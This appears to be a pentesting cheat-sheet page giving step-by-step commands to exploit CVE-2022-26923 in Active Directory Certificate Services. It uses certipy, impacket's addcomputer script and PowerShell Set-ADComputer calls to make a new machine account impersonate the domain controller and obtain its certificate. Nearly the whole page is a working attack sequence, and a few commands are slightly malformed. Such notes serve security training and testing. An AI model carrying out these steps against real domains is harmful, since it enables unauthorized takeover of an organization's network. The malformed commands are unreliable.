---
title: AD CS PrivEsc
desc: AD CS (Active Directory Certificate Services) is vulnerable to privilege escalation (CVE-2022-26923).
tags: [ActiveDirectory, PrivEsc, Windows]
alts: [WindowsPrivEsc]
website:
render_with_liquid: false
---

## 1. Configure DNS

Modify DNS hostname on attack machine.

```sh
10.0.0.1 vuln.com vulndc VULN-VULNDC-CA vuln.local
```

<br />

## 2. Test Certificate Generation

```sh
# Request cerification
certipy req 'vuln.local/username:password@vuln.com' -ca VULNDC-CA -template User

# Authentication
certipy auth -pfx administrator.pfx
```

<br />

## 3. Add a Computer to the Domain

```sh
python3 ./impacket/examples.addcomputer.py 'vuln.local/username:password' -method LDAPS -computer-name 'MYPC' -computer-pass 'MyPcPassword'

# Request certification for the computer
# Use your own username and password (ex. 'MYPC$:MyPcPassword')
certipy req 'vuln.local/MYPC$:MyPcPassword@vuln.com' -ca VULNDC-CA -template Machine

# Authentication
certipy auth -pfx mypc.pfx
```

<br />

## 4. Update the DNS Hostname and SPN Attributes

```sh
# Connect using SSH
ssh vuln.local\\username@vulndc

# ---------------------------------------------

# On target Windows machine

# Start PowerShell
powershell

# Get the machine which participates the Active Directory
Get-ADComputer MYPC -properties dnshostname,serviceprincipalname

# Remove the current SPN attribute
Set-ADComputer MYPC -ServicePrincipalName @{}

# Then, set the DNS hostname to that of the DC
Set-ADComputer MYPC -DnsHostName VULNDC.vuln.local
```

<br />

## 5. Malicious Certificate (Get Another Machine Certificate)

```sh
# Request a new certificate for the computer again.
certipy req 'vuln.local/MYPC$:MyPcPassword@vuln.com' -ca VULNDC-CA -template Machine

# Then, we got a certificate for the another machine. 
certipy auth -pfx ca.pfx
```